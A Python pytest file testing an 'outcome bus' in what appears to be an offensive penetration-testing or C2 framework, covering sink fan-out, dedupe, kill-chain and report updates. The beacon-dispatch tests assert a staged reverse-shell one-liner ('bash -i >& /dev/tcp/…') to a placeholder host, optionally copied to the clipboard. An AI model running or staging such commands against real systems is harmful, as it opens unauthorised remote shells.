"""Outcome bus BDD contract: one event, every surface, failure isolation.

Every scenario states Given, When, Then. Tests inject sink maps for the
bus mechanics and use temporary session directories for the real sinks.
"""

from __future__ import annotations

import json
from pathlib import Path

from modules.outcome_bus import DEFAULT_SINKS, OutcomeBus, OutcomeEvent


def test_bus_fans_out_dedupes_and_audits(tmp_path: Path):
    """Given two sinks, When one event repeats, Then both run once and the ledger grows once."""
    bus = OutcomeBus(
        ledger_path=tmp_path / "outcomes.jsonl",
        sink_map={"alpha": lambda event: True, "beta": lambda event: True},
    )
    event = OutcomeEvent(kind="finding", target="10.0.0.5", title="demo", cve="CVE-2020-0001")
    first = bus.record(event, sinks=["alpha", "beta"])
    second = bus.record(event, sinks=["alpha", "beta"])
    assert first == {"alpha": True, "beta": True}
    assert second["_deduplicated"] is True
    lines = (tmp_path / "outcomes.jsonl").read_text(encoding="utf-8").splitlines()
    assert len(lines) == 1
    row = json.loads(lines[0])
    assert row["event"]["title"] == "demo" and row["sinks"]["alpha"] is True


def test_bus_isolates_sink_failures(tmp_path: Path):
    """Given one failing sink, When the bus records, Then the healthy sink still runs."""
    def boom(event):
        raise RuntimeError("surface down")

    bus = OutcomeBus(
        ledger_path=tmp_path / "outcomes.jsonl",
        sink_map={"bad": boom, "good": lambda event: True},
    )
    statuses = bus.record(OutcomeEvent(kind="exploit", target="10.0.0.5"), sinks=["bad", "good"])
    assert statuses == {"bad": False, "good": True}


def test_bus_respects_sink_toggles(monkeypatch, tmp_path: Path):
    """Given payload toggles, When the bus records, Then disabled sinks never run."""
    import modules.orchestrator_config as config

    monkeypatch.setattr(config, "sinks", lambda: {"alpha": True, "beta": False})
    bus = OutcomeBus(
        ledger_path=tmp_path / "outcomes.jsonl",
        sink_map={"alpha": lambda event: True, "beta": lambda event: True},
    )
    statuses = bus.record(OutcomeEvent(kind="finding", target="10.0.0.5"), sinks=["alpha", "beta"])
    assert statuses == {"alpha": True}


def test_default_sinks_cover_required_surfaces():
    """Given the default bus, When names resolve, Then every required surface is present."""
    assert {
        "world_model",
        "killchain",
        "routing",
        "c2_surfaces",
        "objectives",
        "event_bus",
        "intel_graph",
        "attack_graph",
        "report",
        "world_diff",
    } <= set(DEFAULT_SINKS)
    assert "campaign_db" not in DEFAULT_SINKS


def test_c2_surface_sink_writes_banner_cve_and_note(tmp_path: Path):
    """Given a shell outcome, When the C2 sink runs, Then banners, CVEs and notes update."""
    from modules.sinks.c2_surfaces import apply

    event = OutcomeEvent(
        kind="exploit",
        target="10.0.0.5",
        host="10.0.0.5",
        title="Demo RCE",
        description="proven",
        severity="critical",
        cve="CVE-2020-0001",
        port="21",
        service="ftp",
        shell=True,
        source="demo_rce",
        banner="vsftpd 2.3.4",
        metadata={"sessions_dir": str(tmp_path)},
    )
    assert apply(event) is True
    banners = json.loads((tmp_path / "banners.json").read_text(encoding="utf-8"))
    cves = json.loads((tmp_path / "cves.json").read_text(encoding="utf-8"))
    notes = json.loads((tmp_path / "notes.txt").read_text(encoding="utf-8"))["content"]
    assert banners["banners"][0]["service"] == "ftp"
    assert cves[0]["title"].startswith("CVE-2020-0001")
    assert "SHELL" in notes


def test_objectives_sink_appends_actionable_finding(tmp_path: Path):
    """Given a finding, When the objectives sink runs, Then one pending objective lands."""
    from modules.sinks.objectives import apply

    event = OutcomeEvent(
        kind="finding",
        target="10.0.0.5",
        title="Weak SSH credentials",
        severity="high",
        source="lazy_loop",
        metadata={"sessions_dir": str(tmp_path)},
    )
    assert apply(event) is True
    rows = (tmp_path / "objectives.jsonl").read_text(encoding="utf-8").splitlines()
    record = json.loads(rows[0])
    assert record["status"] == "pending" and record["priority"] == "high"
    assert "Weak SSH credentials" in record["text"]


def test_report_sink_only_refreshes_terminal_events(monkeypatch):
    """Given a finding and a report event, When the report sink runs, Then only the report triggers."""
    import modules.sinks.report as sink

    calls: list[bool] = []
    monkeypatch.setattr(sink, "refresh_session_report", lambda: calls.append(True) or True)
    assert sink.apply(OutcomeEvent(kind="finding", target="10.0.0.5")) is False
    assert sink.apply(OutcomeEvent(kind="report", target="10.0.0.5")) is True
    assert calls == [True]


def test_intel_graph_sink_writes_summary(tmp_path: Path):
    """Given a session directory, When the intel sink runs, Then the summary is written."""
    from modules.sinks.intel_graph import apply

    event = OutcomeEvent(kind="finding", target="10.0.0.5", metadata={"sessions_dir": str(tmp_path)})
    assert apply(event) is True
    assert (tmp_path / "intel_summary.json").exists()


def test_attack_graph_sink_writes_summary(tmp_path: Path, monkeypatch):
    """Given a session directory, When the attack sink runs, Then the summary is written."""
    import modules.sinks.attack_graph as sink

    monkeypatch.chdir(tmp_path)
    (tmp_path / "payload.json").write_text("{}", encoding="utf-8")
    event = OutcomeEvent(kind="finding", target="10.0.0.5", metadata={"sessions_dir": str(tmp_path)})
    assert sink.apply(event) is True
    assert (tmp_path / "intel_summary.json").exists()


def test_record_outcome_builds_one_exploit_event(monkeypatch, tmp_path: Path):
    """Given an exploit outcome, When the bridge records it, Then the bus receives one full event."""
    import modules.outcome_bus as bus_module
    from modules.atomic_exploit_bridge import ExploitCommand, ExploitSpec, record_outcome

    captured: list = []

    def fake_record(event, sinks=None):
        captured.append(event)
        return {
            "world_model": True,
            "killchain": True,
            "intel_graph": True,
            "attack_graph": True,
            "routing": True,
            "c2_surfaces": True,
            "objectives": True,
            "event_bus": True,
            "report": True,
        }

    monkeypatch.setattr(bus_module, "record", fake_record)
    spec = ExploitSpec(
        id="demo_rce",
        mitre_id="T1190",
        cve="CVE-2020-0001",
        title="Demo RCE",
        severity="critical",
        confidence=0.9,
        commands=[ExploitCommand(run="id", timeout=10)],
    )
    fed = record_outcome(
        spec,
        "10.0.0.5",
        True,
        "uid=0",
        task_id="t1",
        surfaces_dir=tmp_path,
        port="21",
        service="ftp",
        banner="vsftpd",
    )
    event = captured[0]
    assert event.kind == "exploit" and event.shell is True
    assert event.cve == "CVE-2020-0001" and event.port == "21"
    assert event.metadata["sessions_dir"] == str(tmp_path)
    assert fed["cves"] is True and fed["attack_graph"] is True and fed["report"] is True


def test_killchain_sink_only_advances_on_proven_outcomes(monkeypatch):
    """Given failed, dry-run or informational events, When the sink runs, Then no phase moves."""
    import modules.sinks.killchain as sink

    calls: list[tuple[str, str]] = []
    monkeypatch.setattr(
        sink.KillChain,
        "advance_phase",
        staticmethod(lambda phase, host=None: calls.append((phase, host)) or True),
    )

    assert sink.apply(OutcomeEvent(kind="exploit", success=False)) is False
    assert sink.apply(OutcomeEvent(kind="finding", success=True)) is False
    assert sink.apply(OutcomeEvent(kind="emulation", success=True, metadata={"dry_run": True})) is False
    assert sink.apply(OutcomeEvent(kind="chain", success=False)) is False
    assert sink.apply(OutcomeEvent(kind="exploit", success=False, shell=True, target="10.0.0.5")) is True
    assert sink.apply(OutcomeEvent(kind="emulation", success=True)) is True
    assert sink.apply(OutcomeEvent(kind="report", host="10.0.0.5")) is True
    assert calls == [("exploit", "10.0.0.5"), ("exploit", ""), ("report", "")]


def test_objectives_sink_ignores_failed_and_dry_run(tmp_path: Path):
    """Given an unproven outcome, When the objectives sink runs, Then no todo is created."""
    from modules.sinks.objectives import apply

    sessions = {"sessions_dir": str(tmp_path)}
    assert apply(OutcomeEvent(kind="exploit", title="failed", success=False, metadata=sessions)) is False
    assert (
        apply(OutcomeEvent(kind="emulation", title="dry", success=True, metadata={**sessions, "dry_run": True}))
        is False
    )
    assert apply(OutcomeEvent(kind="chain", title="broken", success=False, metadata=sessions)) is False
    assert not (tmp_path / "objectives.jsonl").exists()
    assert apply(OutcomeEvent(kind="finding", title="weak ssh", metadata=sessions)) is True


def test_dedupe_key_includes_port_and_requested_sinks(tmp_path: Path):
    """Given distinct services or sink sets, When recording, Then both events run."""
    calls: list[str] = []
    bus = OutcomeBus(
        ledger_path=tmp_path / "outcomes.jsonl",
        sink_map={"a": lambda event: calls.append("a") or True, "b": lambda event: calls.append("b") or True},
    )
    first = OutcomeEvent(kind="exploit", target="10.0.0.5", title="svc", port="139")
    second = OutcomeEvent(kind="exploit", target="10.0.0.5", title="svc", port="445")
    assert bus.record(first, sinks=["a"]) == {"a": True}
    assert bus.record(second, sinks=["a"]) == {"a": True}
    assert bus.record(first, sinks=["b"]) == {"b": True}
    assert calls == ["a", "a", "b"]


def test_world_diff_sink_records_host_changes(tmp_path: Path):
    """Given a discovery outcome, When the diff sink runs, Then the change lands and the snapshot is stored."""
    from modules.sinks.world_diff import apply

    (tmp_path / "world_model.json").write_text(
        json.dumps({"hosts": {"10.0.0.5": {"ip": "10.0.0.5", "state": "scanned", "services": {}}}}),
        encoding="utf-8",
    )
    event = OutcomeEvent(kind="discovery", target="10.0.0.5", metadata={"sessions_dir": str(tmp_path)})
    assert apply(event) is True
    rows = [json.loads(line) for line in (tmp_path / "lazy_changes.jsonl").read_text().splitlines()]
    assert any(row["kind"] == "host_new" and row["ip"] == "10.0.0.5" for row in rows)
    stored = json.loads((tmp_path / "lazy_host_snapshots.json").read_text())
    assert "10.0.0.5" in stored["hosts"]

    repeat = OutcomeEvent(kind="discovery", target="10.0.0.5", metadata={"sessions_dir": str(tmp_path)})
    assert apply(repeat) is False
    rows = [json.loads(line) for line in (tmp_path / "lazy_changes.jsonl").read_text().splitlines()]
    assert sum(1 for row in rows if row["kind"] == "host_new") == 1


def test_world_diff_sink_detects_service_change(tmp_path: Path):
    """Given a host whose service changed, When the diff sink runs, Then service_changed is logged."""
    from modules.sinks.world_diff import apply

    world = {"hosts": {"10.0.0.5": {"ip": "10.0.0.5", "services": {"22": {"name": "ssh", "product": "OpenSSH", "version": "8.9p1", "state": "open"}}}}}
    (tmp_path / "world_model.json").write_text(json.dumps(world), encoding="utf-8")
    first = OutcomeEvent(kind="discovery", target="10.0.0.5", metadata={"sessions_dir": str(tmp_path)})
    apply(first)
    world["hosts"]["10.0.0.5"]["services"]["22"]["version"] = "9.3p1"
    (tmp_path / "world_model.json").write_text(json.dumps(world), encoding="utf-8")
    second = OutcomeEvent(kind="discovery", target="10.0.0.5", metadata={"sessions_dir": str(tmp_path)})
    assert apply(second) is True
    rows = [json.loads(line) for line in (tmp_path / "lazy_changes.jsonl").read_text().splitlines()]
    assert any(row["kind"] == "service_changed" and row["port"] == 22 for row in rows)


def test_world_diff_sink_ignores_hostless_events(tmp_path: Path):
    """Given an event with no host, When the diff sink runs, Then nothing is written."""
    from modules.sinks.world_diff import apply

    event = OutcomeEvent(kind="finding", target="", metadata={"sessions_dir": str(tmp_path)})
    assert apply(event) is False
    assert not (tmp_path / "lazy_changes.jsonl").exists()


def test_beacon_dispatch_sink_stages_foothold_command(tmp_path: Path, monkeypatch):
    """Given a foothold, When the beacon sink runs, Then a ready revshell command is staged."""
    import modules.sinks.beacon_dispatch as beacon

    monkeypatch.setattr(beacon, "_load_payload", lambda: {"lhost": "192.0.2.10", "reverse_shell_port": 4545})
    event = OutcomeEvent(
        kind="exploit",
        target="10.0.0.5",
        shell=True,
        metadata={"sessions_dir": str(tmp_path)},
    )
    assert beacon.apply(event) is True
    staged = (tmp_path / "beacon_dispatch_10.0.0.5.txt").read_text(encoding="utf-8")
    assert "bash -i >& /dev/tcp/192.0.2.10/4545 0>&1" in staged


def test_beacon_dispatch_sink_ignores_non_foothold(tmp_path: Path, monkeypatch):
    """Given a non-shell event, When the beacon sink runs, Then nothing is staged."""
    import modules.sinks.beacon_dispatch as beacon

    monkeypatch.setattr(beacon, "_load_payload", lambda: {"lhost": "192.0.2.10", "reverse_shell_port": 4545})
    event = OutcomeEvent(kind="finding", target="10.0.0.5", shell=False, metadata={"sessions_dir": str(tmp_path)})
    assert beacon.apply(event) is False
    assert not (tmp_path / "beacon_dispatch_10.0.0.5.txt").exists()


def test_beacon_dispatch_sink_requires_c2_target(tmp_path: Path, monkeypatch):
    """Given no lhost configured, When the beacon sink runs, Then it fails closed."""
    import modules.sinks.beacon_dispatch as beacon

    monkeypatch.setattr(beacon, "_load_payload", lambda: {"lhost": "", "reverse_shell_port": 4545})
    event = OutcomeEvent(kind="exploit", target="10.0.0.5", shell=True, metadata={"sessions_dir": str(tmp_path)})
    assert beacon.apply(event) is False
    assert not list(tmp_path.glob("beacon_dispatch_*"))


def test_beacon_dispatch_sink_clips_when_enabled(tmp_path: Path, monkeypatch):
    """Given loop_auto_beacon enabled, When the sink runs, Then the command is copied."""
    import modules.sinks.beacon_dispatch as beacon

    copies: list[str] = []
    monkeypatch.setattr(beacon, "_load_payload", lambda: {"lhost": "192.0.2.10", "reverse_shell_port": 4545, "loop_auto_beacon": True})
    monkeypatch.setattr(beacon, "_copy_clipboard", lambda text: copies.append(text) or True)
    event = OutcomeEvent(kind="shell", target="10.0.0.9", shell=True, metadata={"sessions_dir": str(tmp_path)})
    assert beacon.apply(event) is True
    assert copies and "/dev/tcp/192.0.2.10/4545" in copies[0]


def test_transient_sink_failure_is_retried(tmp_path: Path):
    """Given a sink that fails once, When the event repeats, Then it is not cached as done."""
    state = {"fail": True}
    calls: list[int] = []

    def flaky(_event):
        if state["fail"]:
            state["fail"] = False
            raise RuntimeError("surface down")
        calls.append(1)
        return True

    bus = OutcomeBus(ledger_path=tmp_path / "outcomes.jsonl", sink_map={"flaky": flaky})
    event = OutcomeEvent(kind="finding", target="10.0.0.5", title="retry")
    assert bus.record(event, sinks=["flaky"]) == {"flaky": False}
    assert bus.record(event, sinks=["flaky"]) == {"flaky": True}
    assert calls == [1]


def test_concurrent_duplicates_fan_out_once(tmp_path: Path):
    """Given two threads, When they record the same event, Then the sink runs once."""
    from concurrent.futures import ThreadPoolExecutor

    calls: list[int] = []
    bus = OutcomeBus(
        ledger_path=tmp_path / "outcomes.jsonl",
        sink_map={"only": lambda event: calls.append(1) or True},
    )
    event = OutcomeEvent(kind="finding", target="10.0.0.5", title="race")
    with ThreadPoolExecutor(max_workers=8) as pool:
        list(pool.map(lambda _: bus.record(event, sinks=["only"]), range(8)))
    assert calls == [1]
